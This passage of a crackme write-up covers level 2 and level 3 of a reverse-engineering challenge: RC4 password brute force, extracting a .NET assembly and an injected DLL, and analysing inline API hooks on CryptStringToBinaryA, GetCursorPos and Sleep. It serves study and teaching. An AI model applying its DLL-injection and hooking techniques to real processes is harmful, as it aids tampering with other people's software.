</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">dec</span><span class="p">)</span>
</span></span></code></pre></div><p>and ho surprise:</p>
<pre tabindex="0"><code>% python rc4_all_exe_names.py 
b&#39;ProcessHacker&#39;
b&#39;we_are_good_to_go_to_level3!&#39;
</code></pre><p>yeah&hellip; turned out the hashes are done on the lowercase password, but of course the RC4 key isn&rsquo;t key insensitive&hellip;</p>
<p><img src="facepalm.jpg" alt="facepal"></p>
<p>Anyway, we have the password for level2: <code>ProcessHacker</code></p>
<p><img src="32-l2-level_up.png" alt="level up"></p>
<h2 id="3-level-3">3. Level 3</h2>
<h3 id="31-first-impression">3.1 First impression</h3>
<p>As earlier mentionned, level2.exe spins two threads:</p>
<ul>
<li>one dealing with the named pipe for level 2</li>
<li>one listening on localhost:1337 for level 3</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">th_stage3_param</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">int_1337</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage3_param</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">check_stage3_password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">th_stage3</span> <span class="o">=</span> <span class="n">create_stage3_thread</span><span class="p">(</span><span class="n">th_stage3_param</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">th_stage3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
</span></span></code></pre></div><p>Let&rsquo;s examine the <code>check_stage3_password</code> function.</p>
<p>It starts off by initializing a byte array, similarly to level 2:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA39BB17F</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x987AB8DB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x2F6BE93E</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5A40C4AC</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5F900F42</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xAB9CF15C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xF51B7932</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6A3CA0C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4A4A45C4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x21591DF6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xC7F3DA41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA3EEEFBA</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x45820D2D</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x34D33517</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xD7C3DCCB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xFA5E5BB3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x69E23F67</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">crypted</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5A4102EF</span><span class="p">;</span>
</span></span></code></pre></div><p>followed by a call to <code>CryptStringToBinaryA</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="c1">// base 64 decode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">CryptStringToBinaryA</span><span class="p">(</span><span class="n">input_password</span><span class="p">,</span> <span class="n">cchString</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="n">decoded_base64</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcbBinary</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pdwFlags</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">NOPE</span><span class="p">;</span>
</span></span></code></pre></div><p><strong>Note</strong>: The 3rd parameter is 0x1, which means CRYPT_STRING_BASE64 / base64 without headers (ref: <a href="https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptstringtobinarya">Microsoft</a>)</p>
<p>Then, the decoded base64 is processed by a small loop, doing ROR/ROL based on the <em>Y cursor coordinate</em> and checking it against the <em>X cursor coordinate</em>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">pcbBinary</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">  	<span class="c1">// GetCursorPos - what ???
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span> <span class="n">GetCursorPos</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Point</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">point_y</span> <span class="o">=</span> <span class="n">Point</span><span class="p">.</span><span class="n">y</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">decoded_base64</span><span class="p">[</span><span class="n">n</span> <span class="o">%</span> <span class="n">decStrLen</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v12</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v13</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v14</span> <span class="o">=</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>                       <span class="c1">// odd
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">v13</span> <span class="o">&lt;&lt;</span> <span class="n">point_y</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v16</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">&gt;&gt;</span> <span class="n">point_y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>                                      <span class="c1">// even
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">v13</span> <span class="o">&gt;&gt;</span> <span class="n">point_y</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v12</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">v15</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">point_y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v16</span> <span class="o">=</span> <span class="n">v11</span> <span class="o">&lt;&lt;</span> <span class="n">point_y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// we want this to be TRUE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">v16</span> <span class="o">|</span> <span class="n">v15</span><span class="p">)</span> <span class="o">==</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">Point</span><span class="p">.</span><span class="n">x</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded_base64</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">dec_byte</span><span class="p">;</span>			<span class="c1">// replace the byte in place in the string
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">      <span class="c1">// we sure need some sleep...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">Sleep</span><span class="p">(</span><span class="mh">0x1Eu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      <span class="n">decStrLen</span> <span class="o">=</span> <span class="n">strlen_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">++</span><span class="n">n</span> <span class="o">&gt;=</span> <span class="n">strlen_size</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">CHECK_CHAR_SET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">NOPE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>after this wizardry, we&rsquo;re supposed to be left with a more or less ascii printable string:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">decoded_base64</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">chr</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">chr</span> <span class="o">&gt;=</span> <span class="sc">&#39; &#39;</span> <span class="o">&amp;&amp;</span> <span class="n">chr</span> <span class="o">!=</span> <span class="mi">127</span> <span class="o">||</span> <span class="n">chr</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="o">||</span> <span class="n">chr</span> <span class="o">==</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xFF</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">NOPE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>which will serve (again !) as a RC4 key, which should decrypt the byterarray to something more or less ascii printable</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="n">rc4_decrypt</span><span class="p">(</span><span class="n">decoded_base64</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">crypted</span><span class="p">,</span> <span class="mh">0x48u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_chr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">crypted</span> <span class="o">+</span> <span class="n">j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">_chr</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_chr</span> <span class="o">&gt;=</span> <span class="sc">&#39; &#39;</span> <span class="o">&amp;&amp;</span> <span class="n">_chr</span> <span class="o">!=</span> <span class="mi">127</span> <span class="o">||</span> <span class="n">_chr</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="o">||</span> <span class="n">_chr</span> <span class="o">==</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">++</span><span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x48</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">NONO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>Easy game ! Except that <code>GetCursorPos()</code> call in the loop right after the base64 decode&hellip;
Are we supposed to guess the password <strong><em>while having the mouse cursor positionned correctly on screen at each loop</em></strong> ?</p>
<p>I don&rsquo;t think so (or rather i hope not), so let&rsquo;s go back a bit&hellip;</p>
<h3 id="32-back-to-stage-2-more-unpacking">3.2 Back to stage 2 (more unpacking)</h3>
<p>If we remember correctly, once the 2nd password is correctly entered, the crackme decrypts a dot NET assembly.
Let&rsquo;s extract it.</p>
<p>We can use dnSpy to dynamically debug the crackme (the crackme is 32 bits so make sure to use the 32 bits version of dnSpy for this task).
In order to do it at the correct moment, we need to close the crackme, open it again and enter the 1st password.</p>
<p>Then, attach the process in dnSpy:</p>
<p><img src="40-l3-attach.png" alt="attach process"></p>
<p>Navigate to the <code>LoadNext.Load</code> method, then click on <code>Assembly.Load</code></p>
<p><img src="41-l3-assembly.load.png" alt="loadnext"></p>
<p>this will automagically take us where we want to set a breakpoint (by pressing F9)</p>
<p><img src="41-l3-breakpoint.png" alt="breakpoint"></p>
<p>Now we can enter the level 2 password and after clicking the &ldquo;level up&rdquo; popup, the breakpoint will be hit.
Right click the <code>rawAssembly</code> local variable and <code>Save...</code> it to file.</p>
<p><img src="43-l3-save_assembly.png" alt="save to file"></p>
<h3 id="33-matryoshka-and-more-unpacking">3.3 Matryoshka (and more unpacking)</h3>
<p>Since we&rsquo;re supposed to have unpacked a Dot NET assembly, we can load the new file straight into dnSpy
We find our friends <code>Level3Bin.Class1</code> and <code>RunMe</code> that we&rsquo;ve seen when following the code handling the click on the level 2 button, inside <code>LoadNext.Load()</code>.</p>
<p><img src="44-l3-runme.png" alt="runme"></p>
<p>along with a promising <code>DropTheDll</code> method and <code>DllInj</code> class.</p>
<p><code>RunMe</code> will create a temp file, write the DLL to it and inject it into the running level2.exe.</p>
<p>There&rsquo;s different ways of gettting this DLL:</p>
<ul>
<li>since the DLL is just base64 encoded in the DropTheDll method, we can also just copy this string and do the base64 decode..</li>
<li>we could also attach a debugger to level2.exe, making sure to break on DLL Load, get the path and copy the file (<code>&quot;C:\\Users\\matth\\AppData\\Local\\Temp\\4x4bdt1g.dat&quot;</code> in this case)</li>
</ul>
<p><img src="45-l3-dll_path.png" alt="dllpath"></p>
<pre tabindex="0"><code>C:\Users\matth\Desktop\MalwareBytes&gt;copy C:\Users\matth\AppData\Local\Temp\4x4bdt1g.dat level3_unpacked.dll
        1 file(s) copied.
</code></pre><p>at least we have it now.</p>
<p>The injection code looks pretty standard and is done by the book: you can even find this method on <a href="https://en.wikipedia.org/wiki/DLL_injection#Using_the_LoadLibrary_API_function">Wikipedia</a> :)</p>
<p><img src="46-l3_injection.png" alt="Injection"></p>
<h3 id="34-hooks">3.4 Hooks</h3>
<p>Opening the newly acquired DLL and navigating to DllMain(), the author was kind enough to tell us what is going to happen: hooking !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="kr">__stdcall</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">HANDLE</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">HANDLE</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">fdwReason</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">fdwReason</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">OutputDebugStringA</span><span class="p">(</span><span class="s">&#34;Hooking the process&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004D00</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="n">GetCurrentThread</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10005260</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004570</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_1002AE60</span><span class="p">,</span> <span class="n">sub_10002990</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004570</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_1002AE64</span><span class="p">,</span> <span class="n">sub_10002B10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004570</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_1002AE68</span><span class="p">,</span> <span class="n">sub_10002B60</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004D60</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">OutputDebugStringA</span><span class="p">(</span><span class="s">&#34;Unhooking the process&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_10004D00</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span> <span class="o">=</span> <span class="n">GetCurrentThread</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_10005260</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_10004A10</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_1002AE60</span><span class="p">,</span> <span class="n">sub_10002990</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_10004A10</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_1002AE64</span><span class="p">,</span> <span class="n">sub_10002B10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_10004A10</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dword_1002AE68</span><span class="p">,</span> <span class="n">sub_10002B60</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">sub_10004D60</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At first glance, the DLL is hooking 3 functions, but which ones ?</p>
<p>An easy way to figure this out, is to configure x64dbg to break on DLL Entry, <em>before entering the 2nd password</em>.
When we&rsquo;ll enter the 2nd password, the dll will be injected and run, and the breakpoint will trigger.</p>
<p><img src="48-dll_entry.jpg" alt="break on entry"></p>
<p>From there, navigate to the piece of code performing the hooking and break before it&rsquo;s executed:</p>
<p><img src="47-hooking_the_process.jpg" alt="Hooking the process"></p>
<p>The hooks are revealed:</p>
<p><img src="49-hooks.jpg" alt="hooks revealed"></p>
<ul>
<li>1st hook replaces <code>CryptStringToBinaryA</code></li>
<li>2nd hook replaces <code>GetCursorPos</code></li>
<li>3rd hook replaces <code>_SleepStub</code></li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">      <span class="n">OutputDebugStringA</span><span class="p">(</span><span class="s">&#34;Hooking the process&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004D00</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="kr">thread</span> <span class="o">=</span> <span class="n">GetCurrentThread</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10005260</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">hook</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_trampoline_CryptStringToBinaryA</span><span class="p">,</span> <span class="n">hook_CryptStringToBinaryA</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">hook</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_trampoline_GetCursorPos</span><span class="p">,</span>         <span class="n">hook_GetCursorPos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">hook</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">g_trampoline_SleepStub</span><span class="p">,</span>            <span class="n">hook_SleepSub</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">sub_10004D60</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span></code></pre></div><p>After the hooking, all calls to these 3 functions will be redirected to the new hook_* functions.
This seems to be done by modifying the code in memory rather than by modifying the IAT (Import Address Table)</p>
<p>After the new hook execution, the control flow is not transfered back to the original function, so the hook actually <em>replaces</em> the original function.</p>
<p>This is what <code>GetCursorPos</code> looks like before hooking (we&rsquo;re in user32.dll)</p>
<p><img src="51-iat_hook_getcursorpos_1.jpg" alt="before hooking"></p>
<p>And this is what it looks like after hooking:</p>
<p><img src="51-iat_hook_getcursorpos_2_after_hooking.jpg" alt="after hooking"></p>
<p>The prologue has been replaced by a jump to some code in the injected DLL, precisely to the &ldquo;new&rdquo; GetCursorPos<br>
Here below listing for easy comparison:</p>
<p><img src="52-getcursorpos_assembly.jpg" alt="new GetCursorPos"></p>
<h5 id="note"><em>Note:</em></h5>
<p>In the hooked <code>CryptStringToBinaryA</code> there&rsquo;s a call to the actual CryptStringToBinaryA function to perform the base64 decode, this is done using a trampoline:</p>
<p>the instructions (bytes) overwritten by the hook jump are saved when the hook is setup (<code>&amp;g_trampoline_CryptStringToBinaryA</code>), followed by a jump back to the original code, right after the overwrite.</p>
<p>Calling the trampoline executes the original, pre-hooking, code.</p>
<p><img src="53-trampoline.png" alt="Trampoline"></p>
<p>I&rsquo;m no expert but the hooking seems to be done using <a href="https://github.com/microsoft/Detours">Detours</a>.<br>
<em>More info on hooking by Jurriaan Bremer: <a href="http://jbremer.org/x86-api-hooking-demystified/">x86 API Hooking Demystified</a></em></p>
<p>Now let&rsquo;s look the 3 hooks.</p>
<h4 id="341-sleep">3.4.1 Sleep</h4>
<p>Sleep will just increment a global variable</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__stdcall</span> <span class="nf">hook_SleepSub</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="o">++</span><span class="n">g_IncrementedByEachSleep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h4 id="341-cryptstringtobinarya">3.4.1 CryptStringToBinaryA</h4>
<p>CryptStringToBinaryA will actually perform normally, with the addition that it is initializing <code>g_IncrementedByEachSleep</code> to 4</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl">  <span class="c1">///
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// calling the real CryptStringToBinaryA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v10</span> <span class="o">=</span> <span class="n">g_trampoline_CryptStringToBinaryA</span><span class="p">(</span><span class="n">pszString</span><span class="p">,</span> <span class="n">cchString</span><span class="p">,</span> <span class="n">dwFlags</span><span class="p">,</span> <span class="n">pbBinary</span><span class="p">,</span> <span class="n">pcbBinary</span><span class="p">,</span> <span class="n">skip</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="c1">///
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">// setting global counter to 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">counter</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">g_IncrementedByEachSleep</span> <span class="o">=</span> <span class="n">counter</span><span class="p">;</span>
</span></span></code></pre></div><h4 id="341-getcursorpos">3.4.1 GetCursorPos</h4>
<p>GetCursorPos will use the global counter to return (x, y) position values from 2 arrays, instead of the actual cursor position.</p>
